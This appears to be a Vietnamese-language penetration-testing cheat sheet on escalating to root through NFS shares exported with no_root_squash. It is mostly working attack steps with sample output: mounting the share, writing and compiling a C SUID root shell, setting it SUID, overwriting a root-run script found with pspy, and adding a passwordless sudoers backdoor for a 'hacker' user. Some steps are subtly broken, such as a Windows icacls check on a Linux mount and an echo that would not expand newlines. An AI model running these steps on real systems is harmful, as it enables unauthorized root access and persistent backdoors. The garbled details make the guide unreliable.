# NFS Exploits

## Điểm chính khai thác

* Khai thác cấu hình **no\_root\_squash** trong NFS để leo thang đặc quyền lên **root** bằng cách tạo tệp nhị phân SUID trong share có thể ghi, cho phép thực thi lệnh với đặc quyền root trên server
* Share NFS với quyền ghi và **no\_root\_squash** cho phép người dùng root trên máy tấn công tạo hoặc sửa đổi tệp giữ đặc quyền khi chạy trên server
* Kiểm tra các share NFS bằng `showmount` và `/etc/exports` để xác định cấu hình dễ bị khai thác, đặc biệt các share với `*` hoặc IP cụ thể và **no\_root\_squash**
* Yêu cầu quyền truy cập mạng tới NFS server (thường qua cổng 2049) và công cụ NFS client để gắn kết share cục bộ
* Kết hợp với kiểm tra tệp SUID hoặc tập lệnh thực thi trên server (dùng `find` hoặc **pspy**) để xác định các mục tiêu có thể thao túng

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Kiểm tra cấu hình NFS export trên hệ thống cục bộ để tìm share với **no\_root\_squash**:

```
cat /etc/exports
```

Output mong đợi: Danh sách export, ví dụ: `/backup *(rw,no_root_squash)`

Liệt kê NFS share từ xa để xác định các share có thể truy cập và cấu hình:

```
showmount -e <ip>
```

Output mong đợi: Danh sách share, ví dụ: `/backup *`

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra quyền ghi trên thư mục cục bộ để gắn kết NFS share:

```
icacls /mnt/nfs
```

Output mong đợi: Quyền thư mục, ví dụ: `BUILTIN\Users:(M)`

#### Phân tích ngữ cảnh thực thi

Tìm tệp nhị phân SUID trên NFS server để xác định mục tiêu có thể thao túng:

```
find / -perm -4000 -type f 2>/dev/null
```

Output mong đợi: Danh sách tệp SUID, ví dụ: `/backup/shell`

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Gắn kết NFS share vào thư mục cục bộ với quyền đọc-ghi:

```
mount -o rw <ip>:<share_path> /mnt/nfs
```

Ghi chú: Thay `<ip>` và `<share_path>` bằng IP server và đường dẫn share (ví dụ: `/backup`). Đảm bảo NFS client được cài đặt.

Tạo mã nguồn C cho tệp nhị phân SUID trên máy tấn công:

```
echo '#include <unistd.h>\nint main() { setuid(0); setgid(0); execve("/bin/sh", NULL, NULL); return 0; }' > /mnt/nfs/shell.c
```

Ghi chú: Đảm bảo máy tấn công có quyền root để tạo tệp nhị phân với đặc quyền phù hợp.

Biên dịch mã nguồn thành tệp nhị phân:

```
gcc /mnt/nfs/shell.c -o /mnt/nfs/shell
```

Ghi chú: Đảm bảo `gcc` được cài đặt trên máy tấn công. Tệp nhị phân được lưu trong share NFS.

Thiết lập quyền SUID và thực thi cho tệp nhị phân:

```
chmod 4755 /mnt/nfs/shell
```

Ghi chú: Quyền SUID (`4755`) đảm bảo tệp chạy với đặc quyền root trên server.

Cấp quyền thực thi cho tệp nhị phân:

```
chmod +x /mnt/nfs/shell
```

Ghi chú: Đảm bảo tệp có thể chạy trên server.

#### Áp dụng khai thác

Truy cập NFS server và thực thi tệp nhị phân SUID:

```
/backup/shell
```

Ghi chú: Thay `/backup/shell` bằng đường dẫn thực tế của tệp nhị phân trong share. Đảm bảo share được gắn kết trên server.

#### Kích hoạt khai thác

Kiểm tra quyền root sau khi thực thi:

```
id
```

Output mong đợi: Quyền root, ví dụ: `uid=0(root) gid=0(root)`

### Kiểm tra kết quả

Xác nhận quyền root trên NFS server:

```
whoami
```

Output mong đợi: `root`\
Xác nhận: Thử lệnh yêu cầu quyền cao, ví dụ: `echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`.

## Ví dụ khai thác

### Khai thác NFS Share với No\_Root\_Squash

**Kịch bản mẫu**: NFS server tại `192.168.1.101` có share `/backup` với cấu hình `*(rw,no_root_squash)`, máy tấn công có quyền root cục bộ và truy cập mạng tới server. Tạo tệp nhị phân SUID để giành shell root.\
**Output**:

```
showmount -e 192.168.1.101
/backup *

cat /etc/exports
/backup *(rw,no_root_squash)

mount -o rw 192.168.1.101:/backup /mnt/nfs

echo '#include <unistd.h>\nint main() { setuid(0); setgid(0); execve("/bin/sh", NULL, NULL); return 0; }' > /mnt/nfs/shell.c
gcc /mnt/nfs/shell.c -o /mnt/nfs/shell
chmod 4755 /mnt/nfs/shell
chmod +x /mnt/nfs/shell

/backup/shell
id
uid=0(root) gid=0(root)
whoami
root
```

### Khai thác với Pspy và Tệp SUID

**Kịch bản mẫu**: NFS server tại `192.168.1.101` có share `/backup` với `no_root_squash`, máy tấn công dùng **pspy** để phát hiện tập lệnh thực thi định kỳ, sau đó thay thế bằng tệp nhị phân SUID.\
**Output**:

```
showmount -e 192.168.1.101
/backup *

cat /etc/exports
/backup *(rw,no_root_squash)

mount -o rw 192.168.1.101:/backup /mnt/nfs

pspy64
2025/05/16 14:00:01 CMD: UID=0 PID=1234 | /backup/script.sh

echo '#include <unistd.h>\nint main() { setuid(0); setgid(0); execve("/bin/sh", NULL, NULL); return 0; }' > /mnt/nfs/shell.c
gcc /mnt/nfs/shell.c -o /mnt/nfs/script.sh
chmod 4755 /mnt/nfs/script.sh
chmod +x /mnt/nfs/script.sh

id
uid=0(root) gid=0(root)
whoami
root
```
